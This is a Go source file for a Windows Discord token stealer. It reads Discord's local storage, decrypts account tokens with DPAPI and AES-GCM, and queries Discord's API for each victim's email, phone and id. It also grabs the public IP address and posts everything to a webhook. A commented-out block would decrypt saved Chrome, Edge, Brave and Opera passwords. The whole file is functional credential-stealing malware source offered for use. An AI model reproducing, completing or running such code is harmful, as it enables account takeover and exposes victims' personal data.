package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"runtime"
	"strings"
	"unsafe"

	// _ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

const WEBHOOK_URL = ""

// TODO:
// Support Unix, darwin
// Support browser grab
func Grabber() {
	user, _ := os.UserHomeDir()
	paths := make(map[string]map[string]string)
	paths["Discords"] = make(map[string]string)
	paths["cbrowsers"] = make(map[string]string)
	paths["fbrowsers"] = make(map[string]string)
	discord := paths["Discords"]
	cbrowser := paths["cbrowsers"]
	fbrowser := paths["fbrowsers"]

	switch runtime.GOOS {
	case "windows":
		roaming := os.Getenv("APPDATA")

		discord["Discord"] = roaming + "\\Discord\\"
		discord["DiscordPTB"] = roaming + "\\discordptb\\"
		discord["DiscordCanary"] = roaming + "\\discordcanary\\"

		cbrowser["Chrome"] = user + "\\AppData\\Local\\Google\\Chrome\\User Data\\"
		cbrowser["Edge"] = user + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\"
		cbrowser["Brave"] = user + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\"
		cbrowser["Opera"] = user + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\"

		fbrowser[""] = ""
	}

	type Token struct {
		ProtectedToken string
		ProtectedKey   string
	}

	type LocalState struct {
		OSCrypto struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

	// TODO: support browser decrypt
	decrypt := func(protectedtext string, protectedkey string) (string, error) {
		switch runtime.GOOS {
		case "windows":
			encryptedtext, err := base64.StdEncoding.DecodeString(protectedtext)
			if err != nil {
				return "", err
			}

			encryptedkey, err := base64.StdEncoding.DecodeString(protectedkey)
			if err != nil {
				return "", err
			}

			encryptedkey = encryptedkey[5:]

			blob := &windows.DataBlob{
				Size: uint32(len(encryptedkey)),
			}

			if len(encryptedkey) > 0 {
				blob.Data = &encryptedkey[0]
			}

			var outName *uint16
			out := windows.DataBlob{}

			err = windows.CryptUnprotectData(blob, &outName, nil, 0, nil, 0, &out)
			if err != nil {
				return "", err
			}

			ret := make([]byte, out.Size)
			copy(ret, unsafe.Slice(out.Data, out.Size))

			windows.LocalFree(windows.Handle(unsafe.Pointer(out.Data)))
			windows.LocalFree(windows.Handle(unsafe.Pointer(outName)))

			block, err := aes.NewCipher(ret)
			if err != nil {
				return "", err
			}
			aesGCM, err := cipher.NewGCM(block)
			if err != nil {
				return "", err
			}

			plaintext, err := aesGCM.Open(nil, encryptedtext[3:15], encryptedtext[15:], nil)
			if err != nil {
				return "", err
			}

			return string(plaintext), nil

		default:
			return "", errors.New("unknown os")
		}
	}

	// BrowserGrab := func() {
	// 	for _, path := range cbrowser {
	// 		_, err := os.Stat(path)
	// 		if err != nil {
	// 			continue
	// 		} else {
	// 			localstateData, err := os.ReadFile(path + "Local State")
	// 			if err != nil {
	// 				continue
	// 			}

	// 			var localstate LocalState
	// 			json.Unmarshal(localstateData, &localstate)
	// 			fmt.Println(localstate.OSCrypto.EncryptedKey)

	// 			// HistoryDB,err := sql.Open("sqlite3", path+"Default\\History")
	// 			// if err != nil {
	// 			// 	return
	// 			// }

	// 			LoginDataDB, err := sql.Open("sqlite3", path+"Default\\Login Data")
	// 			if err != nil {
	// 				continue
	// 			}

	// 			rows, err := LoginDataDB.Query("SELECT origin_url, username_value, password_value FROM logins")
	// 			if err != nil {
	// 				continue
	// 			}

	// 			for rows.Next() {
	// 				var url string
	// 				var username string
	// 				var protectedpassword string
	// 				if err := rows.Scan(&url, &username, &protectedpassword); err != nil {
	// 					fmt.Println("error")
	// 					continue
	// 				}

	// 				password, err := decrypt(protectedpassword, localstate.OSCrypto.EncryptedKey)
	// 				if err != nil {
	// 					password = "error"
	// 				}

	// 				fmt.Printf("url: %s username: %s password: %s\n", url, username, password)
	// 			}

	// 			// CookieDB, err := os.ReadFile(path + "Default\\Network\\Cookies")
	// 			// if err != nil {
	// 			// 	return
	// 			// }
	// 		}
	// 	}
	// }

	type TokenInfo struct {
		Id               string `json:"id"`
		Username         string `json:"username"`
		DisplayName      string `json:"display_name"`
		Avatar           string `json:"avatar"`
		AvatarDecoration string `json:"avatar_decoration"`
		Discriminator    string `json:"discriminator"`
		Flags            int    `json:"flags"`
		PurchasedFlags   int    `json:"purchased_flags"`
		Banner           int    `json:"banner"`
		BannerColor      string `json:"banner_color"`
		AccentColor      int    `json:"accent_color"`
		Bio              string `json:"bio"`
		Locale           string `json:"locale"`
		NsfwAllowed      bool   `json:"nsfw_allowed"`
		MfaEnabled       bool   `json:"mfa_enabled"`
		PremiumType      int    `json:"premium_type"`
		Email            string `json:"email"`
		Verified         bool   `json:"verified"`
		Phone            string `json:"phone"`
	}

	type Field struct {
		Name   string `json:"name"`
		Value  string `json:"value"`
		Inline bool   `json:"inline"`
	}

	type Embed struct {
		Title       string  `json:"title"`
		Description string  `json:"description"`
		Url         string  `json:"url"`
		Color       int     `json:"color"`
		Fields      []Field `json:"fields"`
	}

	type WebhookData struct {
		Content   string  `json:"content"`
		Username  string  `json:"username,omitempty"`
		AvatarURL string  `json:"avatar_url"`
		Embeds    []Embed `json:"embeds"`
	}

	SendWebhook := func(url string, webhookdata WebhookData) {
		payload, _ := json.Marshal(webhookdata)
		http.Post(url, "application/json", bytes.NewBuffer(payload))
	}

	DiscordGrab := func() []string {
		var result []string

		r := regexp.MustCompile("dQw4w9WgXcQ:([^\"]*)")

		for _, path := range discord {
			_, err := os.Stat(path)
			if err != nil {
				continue
			} else {
				localstateData, _ := os.ReadFile(path + "Local State")
				if err != nil {
					continue
				}

				var localstate LocalState
				json.Unmarshal(localstateData, &localstate)

				files, err := os.ReadDir(path + "Local Storage\\leveldb\\")
				if err != nil {
					continue
				} else {
					for _, file := range files {
						if strings.HasSuffix(file.Name(), ".log") || strings.HasSuffix(file.Name(), ".ldb") {
							content, err := os.ReadFile(path + "Local Storage\\leveldb\\" + file.Name())
							if err != nil {
								continue
							} else {
								matchs := r.FindAllStringSubmatch(string(content), -1)
								for _, match := range matchs {
									// token, err := decrypt(Token{
									// 	ProtectedToken: match[1],
									// 	ProtectedKey:   localstate.OSCrypto.EncryptedKey,
									// })

									token, err := decrypt(match[1], localstate.OSCrypto.EncryptedKey)
									if err != nil {
										continue
									}
									result = append(result, token)
								}
							}
						} else {
							continue
						}
					}
				}
			}
		}

		d := make(map[string]struct{})
		for _, v := range result {
			d[v] = struct{}{}
		}
		var tokens []string
		for k := range d {
			tokens = append(tokens, k)
		}
		return tokens
	}

	// BrowserGrab()
	tokens := DiscordGrab()
	for _, token := range tokens {
		client := http.Client{}
		req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
		req.Header.Add("Authorization", token)
		res, _ := client.Do(req)
		if res.StatusCode != 200 {
			continue
		}
		body, _ := ioutil.ReadAll(res.Body)

		var tokeninfo TokenInfo
		json.Unmarshal(body, &tokeninfo)

		req2, _ := http.Get("https://api.ipify.org/")
		ip, _ := ioutil.ReadAll(req2.Body)

		var webhookdata WebhookData
		var embed Embed
		var field1 Field
		var field2 Field
		var field3 Field
		embed.Title = "Token Grabbed"
		embed.Color = 7536895
		field1.Name = "Account Info"
		field1.Value = fmt.Sprintf("UserName: %s\nEmail: %s\nPhone: %s\nlocale: %s\nbio: %s\nid: %s",
			tokeninfo.Username, tokeninfo.Email, tokeninfo.Phone, tokeninfo.Locale, tokeninfo.Bio, tokeninfo.Id)
		field1.Inline = true
		field2.Name = "Other Info"
		field2.Value = fmt.Sprintf("IP: %s", ip)
		field2.Inline = true
		field3.Name = "Token"
		field3.Value = fmt.Sprintf("```%s```", token)
		embed.Fields = append(embed.Fields, field1, field2, field3)
		webhookdata.Embeds = append(webhookdata.Embeds, embed)
		webhookdata.AvatarURL = fmt.Sprintf("https://cdn.discordapp.com/avatars/%s/%s.webp", tokeninfo.Id, tokeninfo.Avatar)
		webhookdata.Username = tokeninfo.Username
		SendWebhook(WEBHOOK_URL, webhookdata)
	}
}

func main() {
	Grabber()
}
